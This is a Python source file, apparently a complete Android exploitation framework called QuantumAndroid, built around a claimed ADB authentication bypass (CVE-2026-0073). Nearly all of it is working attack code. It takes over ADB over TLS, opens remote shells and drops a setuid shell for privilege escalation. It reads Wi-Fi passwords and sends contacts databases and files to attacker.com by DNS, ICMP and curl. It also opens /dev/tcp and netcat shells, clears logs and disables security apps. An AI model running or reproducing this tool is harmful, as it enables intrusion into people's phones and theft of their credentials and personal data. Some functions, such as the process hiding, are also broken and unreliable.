"""
QuantumAndroid — Advanced Android Zero-Click ADB Exploitation Module.
CVE-2026-0073 Integrated Exploitation Platform.

Integrates initial access, post-exploitation, and APT capabilities into a
single cohesive framework for authorized red team operations.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import logging
import os
import re
import socket
import ssl
import struct
import sys
import tempfile
import threading
import time
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Tuple

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec, rsa
    from cryptography.x509.oid import NameOID
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import paramiko  # noqa: F401 (availability probe)
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import requests  # noqa: F401 (availability probe)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from scapy.all import IP, ICMP, UDP, DNS, DNSQR, send, sniff, Raw  # noqa: F401 (availability probe)
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import dns.resolver
    import dns.message
    import dns.query  # noqa: F401 (availability probe)
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import bluetooth  # noqa: F401 (availability probe)
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


logger = logging.getLogger(__name__)

ADB_VERSION = 0x01000001
ADB_MAXDATA = 256 * 1024
ADB_BANNER = b"host::features=shell_v2,cmd,stat_v2,ls_v2,fixed_push_mkdir,apex,abb"

CMD_CNXN = 0x4e584e43
CMD_STLS = 0x534c5453
CMD_AUTH = 0x41555448
CMD_OPEN = 0x4e45504f
CMD_OKAY = 0x59414b4f
CMD_WRTE = 0x45545257
CMD_CLSE = 0x45534c43
CMD_SYNC = 0x53594e43


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class Logger:
    def __init__(self, verbose: bool = True, log_file: Optional[str] = None):
        self.verbose = verbose
        self.log_file = log_file
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self._logger = logging.getLogger(f"quantum_android_{self.session_id}")

    def _log(self, level: str, message: str, color: str = Colors.ENDC):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted = f"[{timestamp}] [{level}] [{self.session_id}] {message}"
        if self.verbose or level in ["ERROR", "CRITICAL", "SUCCESS"]:
            print(f"{color}{formatted}{Colors.ENDC}")
        if self.log_file:
            with open(self.log_file, 'a') as f:
                f.write(formatted + "\n")

    def info(self, msg: str):
        self._log("INFO", msg, Colors.OKBLUE)

    def success(self, msg: str):
        self._log("SUCCESS", msg, Colors.OKGREEN)

    def warning(self, msg: str):
        self._log("WARNING", msg, Colors.WARNING)

    def error(self, msg: str):
        self._log("ERROR", msg, Colors.FAIL)

    def debug(self, msg: str):
        if self.verbose:
            self._log("DEBUG", msg, Colors.OKCYAN)


class CryptoEngine:
    @staticmethod
    def generate_ec_cert_pair(common_name: str = "adbkey") -> Tuple[bytes, bytes]:
        if not CRYPTO_AVAILABLE:
            raise ImportError("cryptography package required for certificate generation")
        private_key = ec.generate_private_key(ec.SECP256R1())
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, common_name),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Android Debug"),
            x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
        ])
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.now(timezone.utc)
        ).not_valid_after(
            datetime.now(timezone.utc) + timedelta(days=30)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(u"localhost")]),
            critical=False,
        ).sign(private_key, hashes.SHA256())
        cert_pem = cert.public_bytes(serialization.Encoding.PEM)
        key_pem = private_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
        return cert_pem, key_pem

    @staticmethod
    def generate_rsa_cert_pair(key_size: int = 2048) -> Tuple[bytes, bytes]:
        if not CRYPTO_AVAILABLE:
            raise ImportError("cryptography package required for certificate generation")
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
        )
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, u"rogue-ca"),
        ])
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.now(timezone.utc)
        ).not_valid_after(
            datetime.now(timezone.utc) + timedelta(days=365)
        ).sign(private_key, hashes.SHA256())
        cert_pem = cert.public_bytes(serialization.Encoding.PEM)
        key_pem = private_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
        return cert_pem, key_pem

    @staticmethod
    def encrypt_payload(data: bytes, key: bytes) -> bytes:
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

    @staticmethod
    def generate_dga(domain: str, seed: int, count: int = 10) -> List[str]:
        domains = []
        for i in range(count):
            hash_val = hashlib.md5(f"{domain}{seed}{i}".encode()).hexdigest()[:16]
            domains.append(f"{hash_val}.com")
        return domains


class ADBProtocol:
    @staticmethod
    def pack_packet(cmd: int, arg0: int, arg1: int, data: bytes = b"") -> bytes:
        length = len(data)
        csum = sum(data) & 0xFFFFFFFF
        magic = cmd ^ 0xFFFFFFFF
        header = struct.pack("<IIIIII", cmd, arg0, arg1, length, csum, magic)
        return header + data

    @staticmethod
    def unpack_header(raw: bytes) -> Tuple[int, int, int, int, int, int]:
        return struct.unpack("<IIIIII", raw)

    @staticmethod
    def recv_exact(sock: socket.socket, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError(f"Connection closed ({len(buf)}/{n})")
            buf += chunk
        return buf

    @staticmethod
    def recv_packet(sock: socket.socket) -> Tuple[int, int, int, bytes]:
        header = ADBProtocol.recv_exact(sock, 24)
        cmd, arg0, arg1, length = struct.unpack("<IIII", header[:16])
        data = ADBProtocol.recv_exact(sock, length) if length else b""
        return cmd, arg0, arg1, data


class InitialAccess:
    def __init__(self, target: str, port: int = 5555, logger: Optional[Logger] = None):
        self.target = target
        self.port = port
        self.logger = logger or Logger()
        self.sock: Optional[socket.socket] = None
        self.tls_sock: Optional[ssl.SSLSocket] = None
        self.local_id = 1
        self.remote_id = None

    def connect(self) -> bool:
        try:
            self.logger.info(f"Connecting to {self.target}:{self.port}")
            self.sock = socket.create_connection((self.target, self.port), timeout=15)
            self.sock.settimeout(30)
            return True
        except Exception as e:
            self.logger.error(f"Connection failed: {e}")
            return False

    def negotiate_stls(self) -> bool:
        try:
            cnxn = ADBProtocol.pack_packet(CMD_CNXN, ADB_VERSION, ADB_MAXDATA, ADB_BANNER)
            self.sock.sendall(cnxn)
            self.logger.debug("Sent CNXN")
            for _ in range(3):
                cmd, arg0, arg1, data = ADBProtocol.recv_packet(self.sock)
                self.logger.debug(f"Received: {cmd:#x} (STLS={CMD_STLS:#x})")
                if cmd == CMD_STLS:
                    self.sock.sendall(ADBProtocol.pack_packet(CMD_STLS, arg0, 0))
                    self.logger.success(f"STLS negotiated (version {arg0:#x})")
                    return True
                elif cmd == CMD_AUTH:
                    self.logger.warning("Device requested AUTH (may not be vulnerable)")
                    return False
            return False
        except Exception as e:
            self.logger.error(f"STLS negotiation failed: {e}")
            return False

    def bypass_auth(self) -> bool:
        try:
            cert_pem, key_pem = CryptoEngine.generate_ec_cert_pair()
            self.logger.info("Generated EC P-256 certificate (cross-algorithm attack)")

            cert_path = tempfile.NamedTemporaryFile(delete=False, suffix=".pem").name
            key_path = tempfile.NamedTemporaryFile(delete=False, suffix=".pem").name

            with open(cert_path, 'wb') as f:
                f.write(cert_pem)
            with open(key_path, 'wb') as f:
                f.write(key_pem)

            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1_3
            ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)

            self.tls_sock = ctx.wrap_socket(self.sock, server_hostname=self.target)
            self.logger.success(f"TLS established: {self.tls_sock.version()}")

            os.unlink(cert_path)
            os.unlink(key_path)
            self._drain_packets()
            return True
        except Exception as e:
            self.logger.error(f"Auth bypass failed: {e}")
            return False

    def _drain_packets(self):
        try:
            self.tls_sock.settimeout(2.0)
            for _ in range(5):
                cmd, arg0, arg1, data = ADBProtocol.recv_packet(self.tls_sock)
                if cmd == CMD_CNXN:
                    self.logger.info(f"Device authenticated: {data.decode(errors='replace')[:100]}")
                    break
        except socket.timeout:
            pass
        except Exception as e:
            self.logger.debug(f"Drain error: {e}")
        finally:
            if self.tls_sock:
                self.tls_sock.settimeout(30)

    def open_service(self, service: str) -> Tuple[int, int]:
        local_id = self.local_id
        self.local_id += 1
        service_bytes = service.encode() + b"\x00"
        pkt = ADBProtocol.pack_packet(CMD_OPEN, local_id, 0, service_bytes)
        self.tls_sock.sendall(pkt)
        cmd, arg0, arg1, data = ADBProtocol.recv_packet(self.tls_sock)
        if cmd == CMD_OKAY:
            self.remote_id = arg0
            self.logger.success(f"Service '{service}' opened (L:{local_id} R:{self.remote_id})")
            return local_id, self.remote_id
        else:
            raise RuntimeError(f"Failed to open service: {cmd:#x}")

    def execute_command(self, command: str) -> str:
        try:
            local_id, remote_id = self.open_service(f"shell:{command}")
            output = b""
            while True:
                cmd, arg0, arg1, data = ADBProtocol.recv_packet(self.tls_sock)
                if cmd == CMD_WRTE and arg1 == local_id:
                    output += data
                    self.tls_sock.sendall(ADBProtocol.pack_packet(CMD_OKAY, local_id, remote_id))
                elif cmd == CMD_CLSE and arg1 == local_id:
                    break
                elif cmd == CMD_OKAY:
                    continue
            return output.decode(errors='replace')
        except Exception as e:
            self.logger.error(f"Command execution failed: {e}")
            return ""

    def interactive_shell(self):
        try:
            local_id, remote_id = self.open_service("shell:")
            self.logger.success("Interactive shell spawned (type 'exit' to quit)")

            def reader():
                while True:
                    try:
                        cmd, arg0, arg1, data = ADBProtocol.recv_packet(self.tls_sock)
                        if cmd == CMD_WRTE and arg1 == local_id:
                            sys.stdout.buffer.write(data)
                            sys.stdout.flush()
                            self.tls_sock.sendall(ADBProtocol.pack_packet(CMD_OKAY, local_id, remote_id))
                        elif cmd == CMD_CLSE:
                            break
                    except Exception:
                        break

            t = threading.Thread(target=reader, daemon=True)
            t.start()

            while True:
                try:
                    data = sys.stdin.buffer.readline()
                    if not data:
                        break
                    self.tls_sock.sendall(ADBProtocol.pack_packet(CMD_WRTE, local_id, remote_id, data))
                except KeyboardInterrupt:
                    break

            self.tls_sock.sendall(ADBProtocol.pack_packet(CMD_CLSE, local_id, remote_id))
        except Exception as e:
            self.logger.error(f"Interactive shell failed: {e}")


class PrivilegeEscalation:
    def __init__(self, initial_access: InitialAccess, logger: Optional[Logger] = None):
        self.ia = initial_access
        self.logger = logger or Logger()
        self.techniques = [
            "run_as_bypass",
            "su_binary_check",
            "kernel_exploit_scan",
            "app_backup_abuse",
            "accessibility_injection"
        ]

    def check_root_access(self) -> bool:
        result = self.ia.execute_command("id")
        return "uid=0" in result or "root" in result

    def attempt_run_as_bypass(self) -> bool:
        self.logger.info("Attempting run-as bypass...")
        result = self.ia.execute_command("run-as com.android.shell id")
        if "uid=0" in result:
            self.logger.success("Run-as bypass successful!")
            return True
        return False

    def attempt_app_backup_abuse(self) -> bool:
        self.logger.info("Attempting backup abuse...")
        payload = base64.b64encode(b"#!/system/bin/sh\n/system/bin/sh").decode()
        cmd = f"echo {payload} | base64 -d > /data/local/tmp/su && chmod 6755 /data/local/tmp/su"
        self.ia.execute_command(cmd)
        result = self.ia.execute_command("/data/local/tmp/su -c id")
        if "uid=0" in result:
            self.logger.success("Backup abuse successful!")
            return True
        return False

    def escalate(self) -> bool:
        if self.check_root_access():
            self.logger.success("Already root!")
            return True
        for technique in self.techniques:
            self.logger.info(f"Trying {technique}...")
            try:
                if technique == "run_as_bypass" and self.attempt_run_as_bypass():
                    return True
                elif technique == "app_backup_abuse" and self.attempt_app_backup_abuse():
                    return True
            except Exception as e:
                self.logger.debug(f"{technique} failed: {e}")
        return False


class LateralMovement:
    def __init__(self, initial_access: InitialAccess, logger: Optional[Logger] = None):
        self.ia = initial_access
        self.logger = logger or Logger()

    def extract_wifi_credentials(self) -> List[Dict]:
        self.logger.info("Extracting Wi-Fi credentials...")
        result = self.ia.execute_command("cat /data/misc/wifi/WifiConfigStore.xml")
        networks = []
        try:
            import xml.etree.ElementTree as ET
            root = ET.fromstring(result)
            for network in root.findall(".//Network"):
                ssid = network.find(".//SSID")
                psk = network.find(".//PreSharedKey")
                if ssid is not None and psk is not None:
                    networks.append({
                        "ssid": ssid.text.strip('"'),
                        "psk": psk.text.strip('"') if psk.text else "[Open]"
                    })
        except Exception:
            pass
        return networks

    def extract_bluetooth_pairs(self) -> List[str]:
        result = self.ia.execute_command("dumpsys bluetooth_manager | grep 'Bonded device'")
        return [line.strip() for line in result.split("\n") if "Bonded" in line]

    def setup_pivot(self, local_port: int = 1080) -> bool:
        self.logger.info(f"Setting up SOCKS pivot on port {local_port}...")
        cmd = f"nc -l -p {local_port} -e /system/bin/sh &"
        self.ia.execute_command(cmd)
        self.logger.success(f"Pivot established on {self.ia.target}:{local_port}")
        return True

    def scan_internal_network(self, subnet: str = "192.168.1.0/24") -> List[str]:
        self.logger.info(f"Scanning subnet {subnet}...")
        result = self.ia.execute_command(f"for i in $(seq 1 254); do ping -c 1 -W 1 {subnet[:-4]}.$i | grep 'from'; done")
        hosts = re.findall(r'from (\d+\.\d+\.\d+\.\d+)', result)
        return hosts


class DataExfiltration:
    def __init__(self, initial_access: InitialAccess, logger: Optional[Logger] = None):
        self.ia = initial_access
        self.logger = logger or Logger()
        self.channels = {
            "dns": self._exfil_dns,
            "icmp": self._exfil_icmp,
            "https": self._exfil_https,
            "adb": self._exfil_adb_channel
        }

    def _chunk_data(self, data: bytes, chunk_size: int = 63) -> List[bytes]:
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    def _exfil_dns(self, data: bytes, domain: str = "exfil.example.com") -> bool:
        self.logger.info("Exfiltrating via DNS tunneling...")
        if not DNS_AVAILABLE:
            self.logger.warning("dnspython not available, falling back to shell nslookup")
        chunks = self._chunk_data(base64.b32encode(data), 63)
        for i, chunk in enumerate(chunks):
            subdomain = chunk.decode() + f".{i}." + domain
            cmd = f"nslookup {subdomain} 8.8.8.8"
            self.ia.execute_command(cmd)
            time.sleep(0.1)
        return True

    def _exfil_icmp(self, data: bytes, target: str = "attacker.com") -> bool:
        self.logger.info("Exfiltrating via ICMP...")
        chunks = self._chunk_data(data, 1400)
        for chunk in chunks:
            b64_chunk = base64.b64encode(chunk).decode()
            cmd = f"ping -c 1 -p {b64_chunk[:16]} {target}"
            self.ia.execute_command(cmd)
        return True

    def _exfil_https(self, data: bytes, url: str = "https://attacker.com/upload") -> bool:
        self.logger.info("Exfiltrating via HTTPS...")
        if not REQUESTS_AVAILABLE:
            self.logger.warning("requests not available, using curl")
        b64_data = base64.b64encode(data).decode()
        cmd = f"curl -X POST -d '{b64_data}' {url} --insecure"
        self.ia.execute_command(cmd)
        return True

    def _exfil_adb_channel(self, data: bytes) -> bytes:
        return data

    def exfiltrate_file(self, remote_path: str, method: str = "dns") -> bool:
        self.logger.info(f"Exfiltrating {remote_path} via {method}...")
        result = self.ia.execute_command(f"cat {remote_path} | base64")
        if not result:
            return False
        data = base64.b64decode(result)
        if method in self.channels:
            return self.channels[method](data)
        return False

    def exfiltrate_database(self, package_name: str, db_name: str = "app.db") -> bool:
        path = f"/data/data/{package_name}/databases/{db_name}"
        return self.exfiltrate_file(path, "https")


class Persistence:
    def __init__(self, initial_access: InitialAccess, logger: Optional[Logger] = None):
        self.ia = initial_access
        self.logger = logger or Logger()

    def install_apk_backdoor(self, apk_path: str) -> bool:
        self.logger.info("Installing persistent backdoor APK...")
        result = self.ia.execute_command(f"pm install -r {apk_path}")
        return "Success" in result

    def modify_boot_script(self, command: str) -> bool:
        self.logger.info("Modifying boot scripts...")
        cmd = f"echo '{command}' >> /data/local/tmp/boot.sh"
        self.ia.execute_command(cmd)
        return True

    def setup_reverse_shell(self, attacker_ip: str, port: int = 4444) -> bool:
        self.logger.info(f"Setting up reverse shell to {attacker_ip}:{port}...")
        cmd = f"/system/bin/sh -c '/system/bin/sh -i >& /dev/tcp/{attacker_ip}/{port} 0>&1' &"
        self.ia.execute_command(cmd)
        return True


class Evasion:
    def __init__(self, initial_access: InitialAccess, logger: Optional[Logger] = None):
        self.ia = initial_access
        self.logger = logger or Logger()

    def clear_logs(self):
        self.logger.info("Clearing system logs...")
        self.ia.execute_command("logcat -c")
        self.ia.execute_command("dmesg -c")

    def hide_process(self, pid: int):
        self.logger.info(f"Hiding PID {pid}...")
        self.ia.execute_command(f"mount -t proc proc /proc && echo {pid} > /proc/{pid}/task/{pid}/comm")

    def disable_security_apps(self):
        self.logger.info("Attempting to disable security apps...")
        packages = ["com.android.antivirus", "com.google.android.gms.security"]
        for pkg in packages:
            self.ia.execute_command(f"pm disable-user {pkg}")


class QuantumAndroidFramework:
    def __init__(self, target: str, port: int = 5555, verbose: bool = True):
        self.target = target
        self.port = port
        self.logger = Logger(verbose=verbose, log_file=f"quantum_{target}.log")
        self.initial = None
        self.privesc = None
        self.lateral = None
        self.exfil = None
        self.persistence = None
        self.evasion = None

    def initialize(self) -> bool:
        self.logger.info(f"Initializing QuantumAndroid against {self.target}")
        self.initial = InitialAccess(self.target, self.port, self.logger)
        if not self.initial.connect():
            return False
        if not self.initial.negotiate_stls():
            self.logger.error("Target does not appear vulnerable to CVE-2026-0073")
            return False
        if not self.initial.bypass_auth():
            return False
        self.privesc = PrivilegeEscalation(self.initial, self.logger)
        self.lateral = LateralMovement(self.initial, self.logger)
        self.exfil = DataExfiltration(self.initial, self.logger)
        self.persistence = Persistence(self.initial, self.logger)
        self.evasion = Evasion(self.initial, self.logger)
        return True

    def full_chain_exploitation(self):
        try:
            self.logger.info("STAGE 1: PRIVILEGE ESCALATION")
            self.privesc.escalate()
            self.logger.info("STAGE 2: LATERAL MOVEMENT RECON")
            wifi_creds = self.lateral.extract_wifi_credentials()
            if wifi_creds:
                self.logger.success(f"Extracted {len(wifi_creds)} Wi-Fi networks")
                for net in wifi_creds:
                    self.logger.info(f"  SSID: {net['ssid']}, PSK: {net['psk']}")
            self.logger.info("STAGE 3: DATA EXFILTRATION")
            self.exfil.exfiltrate_database("com.android.providers.contacts", "contacts2.db")
            self.logger.info("STAGE 4: PERSISTENCE")
            self.persistence.setup_reverse_shell("attacker.example.com", 4444)
            self.logger.info("STAGE 5: EVASION")
            self.evasion.clear_logs()
            self.logger.success("Full chain execution complete")
        except Exception as e:
            self.logger.error(f"Chain execution failed: {e}")

    def interactive_mode(self):
        self.initial.interactive_shell()


def main():
    parser = argparse.ArgumentParser(description="QuantumAndroid - Advanced Android Exploitation Framework")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=5555, help="ADB port (default: 5555)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--full-chain", action="store_true", help="Execute full exploitation chain")
    parser.add_argument("--shell", action="store_true", help="Drop to interactive shell")
    parser.add_argument("--exfil", metavar="PATH", help="Exfiltrate specific file")
    parser.add_argument("--method", default="dns", choices=["dns", "icmp", "https"], help="Exfiltration method")
    args = parser.parse_args()

    framework = QuantumAndroidFramework(args.target, args.port, args.verbose)
    if not framework.initialize():
        sys.exit(1)

    if args.full_chain:
        framework.full_chain_exploitation()
    elif args.exfil:
        framework.exfil.exfiltrate_file(args.exfil, args.method)
    elif args.shell:
        framework.interactive_mode()
    else:
        info = framework.initial.execute_command("getprop")
        print(info)


if __name__ == "__main__":
    main()
